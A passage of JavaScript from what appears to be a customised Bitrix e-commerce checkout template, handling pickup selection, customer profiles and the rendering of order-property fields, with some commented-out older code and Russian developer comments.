            if (storeItem && storeInput) {
                if (BX.hasClass(storeItem, "bx-selected")) return;
                storeItemId = storeItem.id.substr("store-".length), (selectedPickUp = this.pickUpBlockNode.querySelector(".bx-selected")) && (selectedPickUp.querySelector(".bx-soa-pickup-l-item-btn .btn").innerText = this.params.MESS_SELECT_PICKUP, BX.removeClass(selectedPickUp, "bx-selected")), h1 = storeItem.clientHeight, storeItem.style.overflow = "hidden", BX.addClass(storeItem, "bx-selected"), h2 = storeItem.clientHeight, storeItem.style.height = h1 + "px", storeItem.querySelector(".bx-soa-pickup-l-item-btn .btn").innerText = this.params.MESS_SELECTED_PICKUP, new BX.easing({
                    duration: 300,
                    start: {height: h1, opacity: 0},
                    finish: {height: h2, opacity: 100},
                    transition: BX.easing.transitions.quad,
                    step: function (state) {
                        storeItem.style.height = state.height + "px"
                    },
                    complete: function () {
                        storeItem.removeAttribute("style")
                    }
                }).animate(), storeInput.setAttribute("value", storeItemId), this.maps && this.maps.selectBalloon(storeItemId)
            }
        }, getDeliverySortedArray: function (objDelivery) {
            var deliveries = [], problemDeliveries = [], sortFunc = function (a, b) {
                var sort = parseInt(a.SORT) - parseInt(b.SORT);
                return 0 === sort ? a.OWN_NAME.toLowerCase() > b.OWN_NAME.toLowerCase() ? 1 : a.OWN_NAME.toLowerCase() < b.OWN_NAME.toLowerCase() ? -1 : 0 : sort
            }, k;
            for (k in objDelivery) objDelivery.hasOwnProperty(k) && ("L" === this.params.SHOW_NOT_CALCULATED_DELIVERIES && objDelivery[k].CALCULATE_ERRORS ? problemDeliveries.push(objDelivery[k]) : deliveries.push(objDelivery[k]));
            return deliveries.sort(sortFunc), problemDeliveries.sort(sortFunc), deliveries.concat(problemDeliveries)
        }, editPropsBlock: function (active) {
            this.propsBlockNode && this.propsHiddenBlockNode && this.result.ORDER_PROP && (active ? this.editActivePropsBlock(!0) : this.editFadePropsBlock(), this.initialized.props = !0)
        }, editActivePropsBlock: function (activeNodeMode) {
            var node = activeNodeMode ? this.propsBlockNode : this.propsHiddenBlockNode, propsContent, propsNode,
                selectedDelivery, showPropMap = !1, i, validationErrors;
            this.opened[this.propsBlockNode.id] && (this.propsBlockNode.classList.remove("bx-step-completed"), this.propsBlockNode.classList.remove("bx-selected")), this.initialized.props ? this.maps && setTimeout(BX.proxy(this.maps.propsMapFocusWaiter, this.maps), 200) : (this.result.IS_AUTHORIZED || this.opened[this.propsBlockNode.id] || (this.opened[this.propsBlockNode.id] = !0), this.opened[this.propsBlockNode.id] || this.propsBlockNode.classList.add("bx-step-completed"), (propsContent = node.querySelector(".bx-soa-section-content")) ? BX.cleanNode(propsContent) : (propsContent = this.getNewContainer(), node.appendChild(propsContent)), this.getErrorContainer(propsContent), this.showPersonType(), propsNode = BX.create("DIV", {props: {className: "row"}}), this.editPropsItems(propsNode), propsContent.appendChild(propsNode), this.showSaveProfile(propsContent)), this.getPropsCompactInfo(), this.result.USER_PROFILES || !this.result.IS_AUTHORIZED ? this.showFirstProps() : setTimeout(BX.delegate((function () {
                this.showFirstProps()
            }), this), 100)
        }, showFirstProps: function () {
            this.checkEmptyProps() ? (this.opened[this.propsBlockNode.id] = !0, this.propsBlockNode.classList.remove("bx-step-completed"), this.propsBlockNode.classList.remove("bx-selected")) : this.opened[this.propsBlockNode.id] && !this.opened.edit_profile && (this.opened[this.propsBlockNode.id] = !1, this.propsBlockNode.classList.add("bx-step-completed"))
        }, checkEmptyProps: function () {
            return this.isValidPropertiesBlock(!0, this.propsBlockNode, !0).length
        }, showSaveProfile: function (node) {
            node.appendChild(BX.create("DIV", {
                props: {className: "bx-soa-more"},
                children: [BX.create("DIV", {
                    props: {className: "bx-soa-more-btn btn btn-default"},
                    html: BX.message("TITLE_SOA_SAVE_INFO_SECTION"),
                    events: {click: BX.proxy(this.saveProfile, this)}
                })]
            }))
        }, saveProfile: function () {
            const propsErrors = this.isValidPropertiesBlock();
            if (!propsErrors.length) if (this.propsBlockNode.querySelector(".alert.alert-danger").style.display = "none", BX.cleanNode(this.propsBlockNode.querySelector(".alert.alert-danger")), BX.removeClass(this.propsBlockNode, "bx-step-error"), this.result.USER_PROFILES) {
                if (!this.startLoader()) return;
                BX.ajax({
                    method: "POST",
                    dataType: "json",
                    url: this.templateFolder + "/ajax.php",
                    data: Object.assign(this.getData("saveProfile"), {props: this.result.ORDER_PROP}),
                    onsuccess: BX.delegate((function (result) {
                        this.endLoader(), result.profileID && (this.opened[this.propsBlockNode.id] = !1, this.opened.edit_profile = !1, this.showTempProfileInput(result), this.sendRequest("", {"change-profile": "Y"})), result.error.length > 0 && console.error(result.error)
                    }), this),
                    onfailure: BX.delegate((function () {
                        this.endLoader()
                    }), this)
                })
            } else this.opened[this.propsBlockNode.id] = !1, this.fade(this.propsBlockNode, this.propsBlockNode), this.show(this.propsBlockNode), document.querySelector(".pandd .bx-active .change-info").click()
        }, showTempProfileInput: function (result) {
            this.propsBlockNode.querySelector(".profiles-content").appendChild(BX.create("INPUT", {
                props: {
                    type: "radio",
                    value: result.profileID,
                    id: "ID_PROFILE_ID_" + result.profileID,
                    name: "PROFILE_ID",
                    className: "hidden",
                    checked: "Y"
                }
            }))
        }, getPropsCompactInfo: function () {
            const $profile = this.propsBlockNode.querySelector(".profiles-content");
            BX.cleanNode($profile), this.showInfoFromProps($profile)
        }, showInfoFromProps: function (node) {
            const content = [];
            let newProfile, profileChangeInput;
            if (this.result.USER_PROFILES && "Y" === this.params.ALLOW_USER_PROFILES) {
                for (let key in this.result.USER_PROFILES) content.unshift(this.showPropItem(this.result.USER_PROFILES[key]));
                "Y" === this.params.ALLOW_NEW_PROFILE && (newProfile = BX.create("div", {
                    props: {className: "col-sm-12"},
                    children: [BX.create("label", {
                        props: {
                            className: "btn btn-default add-profile",
                            htmlFor: "ID_PROFILE_ID_0"
                        },
                        children: [BX.create("INPUT", {
                            props: {
                                type: "radio",
                                value: 0,
                                id: "ID_PROFILE_ID_0",
                                name: "PROFILE_ID",
                                className: "hidden"
                            }
                        }), BX.create("span", {text: BX.message("ADD_NEW_PROFILE")})],
                        events: {click: BX.delegate(this.changeProfile, this)}
                    })]
                })), profileChangeInput = BX.create("INPUT", {
                    props: {
                        type: "hidden",
                        value: "N",
                        id: "profile_change",
                        name: "profile_change"
                    }
                })
            } else content.push(this.showPropItem());
            node.appendChild(BX.create("div", {
                props: {className: "bx-soa-pp row"},
                children: [BX.create("div", {
                    props: {className: "col-sm-12 bx-soa-pp-item-container"},
                    children: content
                }), newProfile, profileChangeInput]
            }))
        }, changeProfile: function () {
            this.opened[this.propsBlockNode.id] = !0, this.opened.edit_profile = !0, BX("ID_PROFILE_ID_0").setAttribute("type", "hidden"), BX("profile_change").value = "Y", this.sendRequest()
        }, showPropItem: function (profile) {
            const innerInfo = [], propForName = this.getPropByFilter({USER_PROPS: "Y", IS_PROFILE_NAME: "Y"});
            let profileValue = this.getInputValueForProp(propForName) || BX.message("NO_PROFILE_NAME");
            profile && profile.NAME && (profileValue = profile.NAME);
            const checked = profile ? profile.CHECKED : "Y", profileID = profile ? profile.ID : 0,
                labelNodes = [BX.create("INPUT", {
                    props: {
                        id: "ID_PROFILE_ID_" + profileID,
                        name: "PROFILE_ID",
                        type: "radio",
                        className: "bx-soa-pp-company-checkbox",
                        value: profileID,
                        checked: checked
                    }, events: {change: BX.delegate(this.selectProfile, this)}
                }), BX.create("LABEL", {
                    props: {
                        htmlFor: "ID_PROFILE_ID_" + profileID,
                        className: "bx-soa-pp-company-label properties__value bx-soa-block-title",
                        lang: "ru"
                    }, html: "<span>" + profileValue + "</span>"
                })], label = BX.create("DIV", {
                    props: {className: "bx-soa-pp-company-graf-container properties"},
                    children: labelNodes
                });
            innerInfo.push(label);
            let isBottomProps = !1;
            const bottomProps = [], propForEmail = this.getPropByFilter({USER_PROPS: "Y", IS_EMAIL: "Y"});
            let emailValue = this.getInputValueForProp(propForEmail);
            if (profile && this.result.USER_PROFILES_PROPS && this.result.USER_PROFILES_PROPS[profile.ID] && this.result.USER_PROFILES_PROPS[profile.ID].EMAIL && (emailValue = this.result.USER_PROFILES_PROPS[profile.ID].EMAIL), emailValue) {
                const email = BX.create("DIV", {
                    props: {className: "bx-soa-pp-company-label properties__value bx-soa-email"},
                    html: "<span>" + emailValue + "</span>"
                });
                bottomProps.push(email), isBottomProps = !0
            }
            const propForPhone = this.getPropByFilter({USER_PROPS: "Y", IS_PHONE: "Y"});
            let phoneValue = this.getInputValueForProp(propForPhone), changeProfile;
            if (profile && this.result.USER_PROFILES_PROPS && this.result.USER_PROFILES_PROPS[profile.ID] && this.result.USER_PROFILES_PROPS[profile.ID].PHONE && (phoneValue = this.result.USER_PROFILES_PROPS[profile.ID].PHONE), phoneValue) {
                const phone = BX.create("DIV", {
                    props: {className: "bx-soa-pp-company-label properties__value bx-soa-phone"},
                    html: "<span>" + phoneValue + "</span>"
                });
                bottomProps.push(phone), isBottomProps = !0
            }
            if ("Y" === checked && (changeProfile = BX.create("DIV", {
                props: {className: "bx-soa-inner"},
                html: "<span class='bx-soa-change-profile font_xs'>" + BX.message("TITLE_SOA_CHANGE_INFO_SECTION") + "</span>",
                events: {click: BX.proxy(this.editProfile, this)}
            })), isBottomProps) {
                const itemBottomProps = BX.create("DIV", {
                    props: {className: "bx-soa-pp-company-props"},
                    children: [BX.create("div", {
                        props: {className: "bx-soa-inner"},
                        children: bottomProps
                    }), changeProfile]
                });
                innerInfo.push(itemBottomProps)
            } else innerInfo.push(changeProfile);
            const itemInnerNode = BX.create("DIV", {
                props: {className: "bx-soa-pp-company-inner filter radio bordered rounded3" + (checked ? " active" : "")},
                children: innerInfo
            }), content = BX.create("div", {
                props: {className: "bx-soa-pp-company bx-soa-pp-company-item col-sm-6 col-xs-12"},
                children: [itemInnerNode]
            });
            return content
        }, selectProfile: function () {
            BX("profile_change").value = "Y", this.sendRequest()
        }, getInputValueForProp: function (prop) {
            if (prop) {
                let $node = document.querySelector("input[name=ORDER_PROP_" + prop.ID + "]");
                return $node && $node.value && $node.value.length > 1 ? $node.value.trim() : null
            }
            return null
        }, getPropByFilter: function (filter) {
            return this.result.ORDER_PROP && this.result.ORDER_PROP.properties && filter ? this.result.ORDER_PROP.properties.find((function (item) {
                return Object.keys(filter).every((function (key) {
                    return item[key] === filter[key]
                }))
            })) : null
        }, editProfile: function () {
            this.propsBlockNode.classList.remove("bx-step-completed"), this.propsBlockNode.classList.remove("bx-selected"), this.opened[this.propsBlockNode.id] = !0
        }, showPersonType: function () {
            const $profile = this.propsBlockNode.querySelector(".bx-soa-person-type");
            BX.cleanNode($profile), this.getPersonTypeControl($profile)
        }, editFadePropsBlock: function () {
            var propsContent = this.propsBlockNode.querySelector(".bx-soa-section-content"), newContent;
            this.initialized.props || (this.editActivePropsBlock(!1), BX.remove(BX.lastChild(this.propsBlockNode)))
        }, editFadePropsContent: function (node) {
            if (node && this.locationsInitialized) {
                var errorNode = this.propsHiddenBlockNode.querySelector(".alert"),
                    personType = this.getSelectedPersonType(), fadeParamName, props, group, property, groupIterator,
                    propsIterator, i, validPropsErrors;
                errorNode && node.appendChild(errorNode.cloneNode(!0)), personType && (fadeParamName = "PROPS_FADE_LIST_" + personType.ID, props = this.params[fadeParamName]), !props || props.length, this.propsBlockNode.getAttribute("data-visited")
            }
        }, editPropsItems: function (propsNode) {
            // if (this.result.ORDER_PROP && this.propertyCollection) {
            //     for (var propsItemsContainer, propsInnerWrapper = BX.create("div", {props: {className: "row row-props group-without-margin"}}), group, property, groupIterator = this.propertyCollection.getGroupIterator(), propsIterator; group = groupIterator();) for (propsIterator = group.getIterator(); property = propsIterator();) this.deliveryLocationInfo.loc != property.getId() && this.deliveryLocationInfo.zip != property.getId() && this.deliveryLocationInfo.city != property.getId() && "80" !== property.getId() && "81" !== property.getId() && "82" !== property.getId() && "83" !== property.getId() && "84" !== property.getId() && "95" !== property.getId() && "96" !== property.getId() && "96" !== property.getId() && "99" !== property.getId() && "100" !== property.getId() && "101" !== property.getId() && "ADDRESS" !== property.getSettings().CODE && this.getPropertyRowNode(property, propsInnerWrapper, !1);
            //     propsItemsContainer = BX.create("DIV", {
            //         props: {className: "col-sm-12 bx-soa-customer"},
            //         children: [propsInnerWrapper]
            //     }), propsNode.appendChild(propsItemsContainer)
            // }

            if (!this.result.ORDER_PROP || !this.propertyCollection)
                return;

            var propsItemsContainer = BX.create('DIV', {props: {className: 'col-sm-12 bx-soa-customer'}}),
                group, property, groupIterator = this.propertyCollection.getGroupIterator(), propsIterator;

            if (!propsItemsContainer)
                propsItemsContainer = this.propsBlockNode.querySelector('.col-sm-12.bx-soa-customer');

            while (group = groupIterator())
            {
                propsIterator =  group.getIterator();
                while (property = propsIterator())
                {
                    //console.log(property.getId());
                    if (
                        this.deliveryLocationInfo.loc == property.getId()
                        || this.deliveryLocationInfo.city == property.getId()
                    )
                        continue;

                    if(property.getId() != 53 && property.getId() != 56 && property.getId() != 95 && property.getId() != 96 && property.getId() != 83 && property.getId() != 81 && property.getId() != 82){// && property.getId() != 26 && property.getId() != 22
                        //оставляю как и было
                        this.getPropertyRowNode(property, propsItemsContainer, false);
                    }else{
                        //записал в массив и выкидываю дальше по коду
                        this.deliveryPropsArray.push(property);
                    }
                }
            }

            propsNode.appendChild(propsItemsContainer);

        }, getPropertyRowNode: function (property, propsItemsContainer, disabled, with_column) {
            // var propsItemNode = BX.create("DIV"), textHtml = "", propertyType = property.getType() || "",
            //     propertyDesc = property.getDescription() || "", label, PropHidden = 'col-sm-2';
            // let bHasColumn = void 0 === with_column || with_column;
            // if ("80" == property.getId() || "82" == property.getId() || "97" == property.getId() || "98" == property.getId() || "101" == property.getId()) {
            //     PropHidden = 'col-sm-2 hidden';
            // }
            // if ("50" == property.getId() || "51" == property.getId() || "52" == property.getId()) {
            //     PropHidden = 'col-sm-4';
            // }
            // if ("99" == property.getId() || "100" == property.getId()) {
            //     PropHidden = 'col-sm-5 hidden';
            // }
            // switch (disabled ? propsItemNode.innerHTML = "<strong>" + BX.util.htmlspecialchars(property.getName()) + ":</strong> " : (BX.addClass(propsItemNode, "bx-soa-customer-field form-group"), bHasColumn && BX.addClass(propsItemNode, PropHidden), textHtml += BX.util.htmlspecialchars(property.getName()), property.isRequired() && (textHtml += '<span class="bx-authform-starrequired">*</span> '), propertyDesc.length && "STRING" != propertyType && "NUMBER" != propertyType && "DATE" != propertyType && (textHtml += " <small>(" + BX.util.htmlspecialchars(propertyDesc) + ")</small>"), label = BX.create("LABEL", {
            //     attrs: {for: "soa-property-" + property.getId()},
            //     props: {className: "bx-soa-custom-label"},
            //     html: textHtml
            // }), propsItemNode.setAttribute("data-property-id-row", property.getId()), propsItemNode.appendChild(label)), propertyType) {
            //     case"LOCATION":
            //         this.insertLocationProperty(property, propsItemNode, disabled);
            //         break;
            //     case"DATE":
            //         this.insertDateProperty(property, propsItemNode, disabled);
            //         break;
            //     case"FILE":
            //         this.insertFileProperty(property, propsItemNode, disabled);
            //         break;
            //     case"STRING":
            //         this.insertStringProperty(property, propsItemNode, disabled);
            //         break;
            //     case"ENUM":
            //         this.insertEnumProperty(property, propsItemNode, disabled);
            //         break;
            //     case"Y/N":
            //         this.insertYNProperty(property, propsItemNode, disabled);
            //         break;
            //     case"NUMBER":
            //         this.insertNumberProperty(property, propsItemNode, disabled)
            // }
            // propsItemsContainer.appendChild(propsItemNode)

            var propsItemNode = BX.create('DIV'),
                textHtml = '',
                propertyType = property.getType() || '',
                propertyDesc = property.getDescription() || '',
                label;

            if (disabled)
            {
                propsItemNode.innerHTML = '<strong>' + BX.util.htmlspecialchars(property.getName()) + ':</strong> ';
            }
            else
            {

                BX.addClass(propsItemNode, "form-group bx-soa-customer-field");

                if(property.getId() == 102 || property.getId() == 103){//property.getId() == 48 || property.getId() == 47 ||
                    BX.addClass(propsItemNode, "col-md-3");
                    propsItemNode.setAttribute("onclick","changeFIO();");
                }else if(property.getId() == 95 || property.getId() == 53 || property.getId() == 96 || property.getId() == 83 || property.getId() == 81 || property.getId() == 82){//property.getId() == 26 ||
                    BX.addClass(propsItemNode, "col-sm-2");
                }else if(property.getId() == 51 || property.getId() == 52){
                    BX.addClass(propsItemNode, "col-sm-3");
                }else if(property.getId() == 50 || property.getId() == 99 || property.getId() == 100  || property.getId() == 104){
                    BX.addClass(propsItemNode, "d-none");
                }else if(property.getId() == 80 || property.getId() == 101 || property.getId() == 54){// || property.getId() == 40 || property.getId() == 22 || property.getId() == 77 || property.getId() == 78 || property.getId() == 79
                    BX.addClass(propsItemNode, "col-md-6 d-none");
                }else{
                     BX.addClass(propsItemNode, "col-md-12");
                }

                BX.addClass(propsItemNode, "custom_props_style");

                if (property.isRequired())
                    textHtml += '<span class="bx-authform-starrequired">*</span> ';

                textHtml += BX.util.htmlspecialchars(property.getName());
                if (propertyDesc.length && propertyType != 'STRING' && propertyType != 'NUMBER' && propertyType != 'DATE')
                    textHtml += ' <small>(' + BX.util.htmlspecialchars(propertyDesc) + ')</small>';

                label = BX.create('LABEL', {
                    attrs: {'for': 'soa-property-' + property.getId()},
                    props: {className: 'bx-soa-custom-label'},
                    html: textHtml
                });
                propsItemNode.setAttribute('data-property-id-row', property.getId());

                propsItemNode.appendChild(label);
            }

            switch (propertyType)
            {
                case 'LOCATION':

                    this.insertLocationProperty(property, propsItemNode, disabled);
                    break;
                case 'DATE':
                    this.insertDateProperty(property, propsItemNode, disabled);
                    break;
                case 'FILE':
                    this.insertFileProperty(property, propsItemNode, disabled);
                    break;
                case 'STRING':
                    this.insertStringProperty(property, propsItemNode, disabled);
                    break;
                case 'ENUM':
                    this.insertEnumProperty(property, propsItemNode, disabled);
                    break;
                case 'Y/N':
                    this.insertYNProperty(property, propsItemNode, disabled);
                    break;
                case 'NUMBER':
                    this.insertNumberProperty(property, propsItemNode, disabled);
            }

            propsItemsContainer.appendChild(propsItemNode);

        },
        insertLocationProperty: function (property, propsItemNode, disabled) {
            var propRow, propNodes, locationString, currentLocation, insertedLoc, propContainer, i, k, values = [];
            if (property.getId() in this.locations) if (disabled) {
                if (propRow = this.propsHiddenBlockNode.querySelector('[data-property-id-row="' + property.getId() + '"]')) for (propNodes = propRow.querySelectorAll("div.bx-soa-loc"), i = 0; i < propNodes.length; i++) locationString = this.getLocationString(propNodes[i]), values.push(locationString.length ? BX.util.htmlspecialchars(locationString) : BX.message("SOA_NOT_SELECTED"));
                propsItemNode.innerHTML += values.join("<br>")
            } else {
                for (propContainer = BX.create("DIV", {props: {className: "soa-property-container"}}), propRow = this.locations[property.getId()], i = 0; i < propRow.length; i++) for (k in currentLocation = propRow[i] ? propRow[i].output : {}, insertedLoc = BX.create("DIV", {
                    props: {className: "bx-soa-loc"},
                    html: currentLocation.HTML
                }), property.isMultiple() && (insertedLoc.style.marginBottom = "search" == this.locationsTemplate ? "5px" : "20px"), propContainer.appendChild(insertedLoc), currentLocation.SCRIPT) currentLocation.SCRIPT.hasOwnProperty(k) && BX.evalGlobal(currentLocation.SCRIPT[k].JS);
                property.isMultiple() && propContainer.appendChild(BX.create("DIV", {
                    attrs: {"data-prop-id": property.getId()},
                    props: {className: "btn btn-sm btn-default"},
                    text: BX.message("ADD_DEFAULT"),
                    events: {click: BX.proxy(this.addLocationProperty, this)}
                })), propsItemNode.appendChild(propContainer)
            }
        }, addLocationProperty: function (e) {
            var target = e.target || e.srcElement, propId = target.getAttribute("data-prop-id"),
                lastProp = BX.previousSibling(target), insertedLoc, k, input, index = 0, prefix = "sls-",
                randomStr = BX.util.getRandomString(5);
            if (BX.hasClass(lastProp, "bx-soa-loc") && ("search" == this.locationsTemplate ? (input = lastProp.querySelector("input[type=text][class=dropdown-field]")) && (index = parseInt(input.name.substring(input.name.indexOf("[") + 1, input.name.indexOf("]"))) + 1) : (input = lastProp.querySelectorAll("input[type=hidden]")).length && (input = input[input.length - 1], index = parseInt(input.name.substring(input.name.indexOf("[") + 1, input.name.indexOf("]"))) + 1)), this.cleanLocations[propId]) {
                for (k in insertedLoc = BX.create("DIV", {
                    props: {className: "bx-soa-loc"},
                    style: {marginBottom: "search" == this.locationsTemplate ? "5px" : "20px"},
                    html: this.cleanLocations[propId].HTML.split("#key#").join(index).replace(/sls-\d{5}/g, "sls-" + randomStr)
                }), target.parentNode.insertBefore(insertedLoc, target), BX.saleOrderAjax.addPropertyDesc({
                    id: propId + "_" + index,
                    attributes: {id: propId + "_" + index, type: "LOCATION", valueSource: "form"}
                }), this.cleanLocations[propId].SCRIPT) this.cleanLocations[propId].SCRIPT.hasOwnProperty(k) && BX.evalGlobal(this.cleanLocations[propId].SCRIPT[k].JS.split("_key__").join("_" + index).replace(/sls-\d{5}/g, "sls-" + randomStr));
                BX.saleOrderAjax.initDeferredControl()
            }
        }, insertDateProperty: function (property, propsItemNode, disabled) {
            var prop, dateInputs, values, i, propContainer, inputText;
            if (disabled) {
                if (prop = this.propsHiddenBlockNode.querySelector('div[data-property-id-row="' + property.getId() + '"]')) {
                    for (values = [], dateInputs = prop.querySelectorAll("input[type=text]"), i = 0; i < dateInputs.length; i++) dateInputs[i].value && dateInputs[i].value.length && values.push(dateInputs[i].value);
                    propsItemNode.innerHTML += this.valuesToString(values)
                }
            } else {
                for (propContainer = BX.create("DIV", {props: {className: "soa-property-container"}}), property.appendTo(propContainer), propsItemNode.appendChild(propContainer), inputText = propContainer.querySelectorAll("input[type=text]"), i = 0; i < inputText.length; i++) this.alterDateProperty(property.getSettings(), inputText[i]);
                this.alterProperty(property.getSettings(), propContainer), this.bindValidation(property.getId(), propContainer)
            }
        }, insertFileProperty: function (property, propsItemNode, disabled) {
            var prop, fileLinks, values, i, html, saved, propContainer;
            if (disabled) {
                if (prop = this.propsHiddenBlockNode.querySelector('div[data-property-id-row="' + property.getId() + '"]')) {
                    for (values = [], fileLinks = prop.querySelectorAll("a"), i = 0; i < fileLinks.length; i++) (html = fileLinks[i].innerHTML).length && values.push(html);
                    propsItemNode.innerHTML += this.valuesToString(values)
                }
            } else (saved = this.savedFilesBlockNode.querySelector('div[data-property-id-row="' + property.getId() + '"]')) && (propContainer = saved.querySelector("div.soa-property-container")), propContainer ? propsItemNode.appendChild(propContainer) : (propContainer = BX.create("DIV", {props: {className: "soa-property-container"}}), property.appendTo(propContainer), propsItemNode.appendChild(propContainer), this.alterProperty(property.getSettings(), propContainer))
        }, insertStringProperty: function (property, propsItemNode, disabled) {
            var prop, inputs, values, i, propContainer;


            if ($(propsItemNode).data('property-id-row') == '53'){// ZIP CODE

            }


            if (disabled) {
                if (prop = this.propsHiddenBlockNode.querySelector('div[data-property-id-row="' + property.getId() + '"]')) {
                    if (values = [], 0 == (inputs = prop.querySelectorAll("input[type=text]")).length && (inputs = prop.querySelectorAll("textarea")), inputs.length) for (i = 0; i < inputs.length; i++) inputs[i].value.length && values.push(inputs[i].value);
                    propsItemNode.innerHTML += this.valuesToString(values)
                }
            }
            else propContainer = BX.create("DIV", {props: {className: "soa-property-container"}}), property.appendTo(propContainer), propsItemNode.appendChild(propContainer), this.alterProperty(property.getSettings(), propContainer), "Y" === property.getSettings().IS_PHONE && this.bindValidationPhone(property.getId(), propContainer), this.bindValidation(property.getId(), propContainer)
        }, insertEnumProperty: function (property, propsItemNode, disabled) {
            var prop, inputs, values, i, propContainer;
            if (disabled) {
                if (prop = this.propsHiddenBlockNode.querySelector('div[data-property-id-row="' + property.getId() + '"]')) {
                    if (values = [], (inputs = prop.querySelectorAll("input[type=radio]")).length) for (i = 0; i < inputs.length; i++) inputs[i].checked && values.push(inputs[i].nextSibling.nodeValue);
                    if ((inputs = prop.querySelectorAll("option")).length) for (i = 0; i < inputs.length; i++) inputs[i].selected && values.push(inputs[i].innerHTML);
                    propsItemNode.innerHTML += this.valuesToString(values)
                }
            } else propContainer = BX.create("DIV", {props: {className: "soa-property-container"}}), property.appendTo(propContainer), propsItemNode.appendChild(propContainer), this.bindValidation(property.getId(), propContainer)
        }, insertYNProperty: function (property, propsItemNode, disabled) {
            var prop, inputs, values, i, propContainer;
            if (disabled) {
                if (prop = this.propsHiddenBlockNode.querySelector('div[data-property-id-row="' + property.getId() + '"]')) {
                    for (values = [], inputs = prop.querySelectorAll("input[type=checkbox]"), i = 0; i < inputs.length; i += 2) values.push(inputs[i].checked ? BX.message("SOA_YES") : BX.message("SOA_NO"));
                    propsItemNode.innerHTML += this.valuesToString(values)
                }
            } else propContainer = BX.create("DIV", {props: {className: "soa-property-container"}}), property.appendTo(propContainer), propsItemNode.appendChild(propContainer), this.alterProperty(property.getSettings(), propContainer), this.bindValidation(property.getId(), propContainer)
        }, insertNumberProperty: function (property, propsItemNode, disabled) {
            var prop, inputs, values, i, propContainer;
            if (disabled) {
                if (prop = this.propsHiddenBlockNode.querySelector('div[data-property-id-row="' + property.getId() + '"]')) {
                    for (values = [], inputs = prop.querySelectorAll("input[type=text]"), i = 0; i < inputs.length; i++) inputs[i].value.length && values.push(inputs[i].value);
                    propsItemNode.innerHTML += this.valuesToString(values)
                }
            } else propContainer = BX.create("DIV", {props: {className: "soa-property-container"}}), property.appendTo(propContainer), propsItemNode.appendChild(propContainer), this.alterProperty(property.getSettings(), propContainer), this.bindValidation(property.getId(), propContainer)
        }, valuesToString: function (values) {
            var str = values.join(", ");
            return str.length ? BX.util.htmlspecialchars(str) : BX.message("SOA_NOT_SELECTED")
        }, alterProperty: function (settings, propContainer) {
            var divs = BX.findChildren(propContainer, {tagName: "DIV"}), i, textNode, inputs, del, add, fileInputs,
                accepts, fileTitles;
            if (divs && divs.length) for (i = 0; i < divs.length; i++) divs[i].style.margin = "5px 0";
            for ((textNode = propContainer.querySelector("input[type=text]")) || (textNode = propContainer.querySelector("textarea")), textNode && (textNode.id = "soa-property-" + settings.ID, "Y" == settings.IS_ADDRESS && textNode.setAttribute("autocomplete", "address"), "Y" == settings.IS_EMAIL && textNode.setAttribute("autocomplete", "email"), "Y" == settings.IS_PAYER && textNode.setAttribute("autocomplete", "name"), "Y" == settings.IS_PHONE && (textNode.setAttribute("autocomplete", "tel"), textNode.classList.add("phone")), settings.PATTERN && settings.PATTERN.length && textNode.removeAttribute("pattern")), inputs = propContainer.querySelectorAll("input[type=text]"), i = 0; i < inputs.length; i++) inputs[i].placeholder = settings.DESCRIPTION, BX.addClass(inputs[i], "form-control bx-soa-customer-input bx-ios-fix");
            for (inputs = propContainer.querySelectorAll("select"), i = 0; i < inputs.length; i++) BX.addClass(inputs[i], "form-control");
            for (inputs = propContainer.querySelectorAll("textarea"), i = 0; i < inputs.length; i++) inputs[i].placeholder = settings.DESCRIPTION, BX.addClass(inputs[i], "form-control bx-ios-fix");
            for (del = propContainer.querySelectorAll("label"), i = 0; i < del.length; i++) BX.remove(del[i]);
            if ("FILE" == settings.TYPE) {
                if (settings.ACCEPT && settings.ACCEPT.length) for (fileInputs = propContainer.querySelectorAll("input[type=file]"), accepts = this.getFileAccepts(settings.ACCEPT), i = 0; i < fileInputs.length; i++) fileInputs[i].setAttribute("accept", accepts);
                for (fileTitles = propContainer.querySelectorAll("a"), i = 0; i < fileTitles.length; i++) BX.bind(fileTitles[i], "click", (function (e) {
                    var target = e.target || e.srcElement,
                        fileInput = target && target.nextSibling && target.nextSibling.nextSibling;
                    fileInput && BX.fireEvent(fileInput, "change")
                }))
            }
            for (add = propContainer.querySelectorAll("input[type=button]"), i = 0; i < add.length; i++) BX.addClass(add[i], "btn btn-default btn-sm"), "Y" == settings.MULTIPLE && i == add.length - 1 || "FILE" == settings.TYPE && (BX.prepend(add[i], add[i].parentNode), add[i].style.marginRight = "10px");
            add.length && (add = add[add.length - 1], BX.bind(add, "click", BX.delegate((function (e) {
                var target = e.target || e.srcElement,
                    targetContainer = BX.findParent(target, {tagName: "div", className: "soa-property-container"}),
                    del = targetContainer.querySelector("label"),
                    add = targetContainer.querySelectorAll("input[type=button]"),
                    textInputs = targetContainer.querySelectorAll("input[type=text]"),
                    textAreas = targetContainer.querySelectorAll("textarea"),
                    divs = BX.findChildren(targetContainer, {tagName: "DIV"}), i, fileTitles, fileInputs, accepts;
                if (divs && divs.length) for (i = 0; i < divs.length; i++) divs[i].style.margin = "5px 0";
                if (this.bindValidation(settings.ID, targetContainer), add.length && add[add.length - 2] && (BX.prepend(add[add.length - 2], add[add.length - 2].parentNode), add[add.length - 2].style.marginRight = "10px", BX.addClass(add[add.length - 2], "btn btn-default btn-sm")), del && BX.remove(del), textInputs.length && (textInputs[textInputs.length - 1].placeholder = settings.DESCRIPTION, BX.addClass(textInputs[textInputs.length - 1], "form-control bx-soa-customer-input bx-ios-fix"), "DATE" == settings.TYPE && this.alterDateProperty(settings, textInputs[textInputs.length - 1]), settings.PATTERN && settings.PATTERN.length && textInputs[textInputs.length - 1].removeAttribute("pattern")), textAreas.length && (textAreas[textAreas.length - 1].placeholder = settings.DESCRIPTION, BX.addClass(textAreas[textAreas.length - 1], "form-control bx-ios-fix")), "FILE" == settings.TYPE) {
                    if (settings.ACCEPT && settings.ACCEPT.length) for (fileInputs = propContainer.querySelectorAll("input[type=file]"), accepts = this.getFileAccepts(settings.ACCEPT), i = 0; i < fileInputs.length; i++) fileInputs[i].setAttribute("accept", accepts);
                    fileTitles = targetContainer.querySelectorAll("a"), BX.bind(fileTitles[fileTitles.length - 1], "click", (function (e) {
                        var target = e.target || e.srcElement,
                            fileInput = target && target.nextSibling && target.nextSibling.nextSibling;
                        fileInput && setTimeout((function () {
                            BX.fireEvent(fileInput, "change")
                        }), 10)
                    }))
                }
            }), this)))
        }, alterDateProperty: function (settings, inputText) {
            var parentNode = BX.findParent(inputText, {tagName: "DIV"}), addon;
            BX.addClass(parentNode, "input-group"), addon = BX.create("DIV", {
                props: {className: "input-group-addon"},
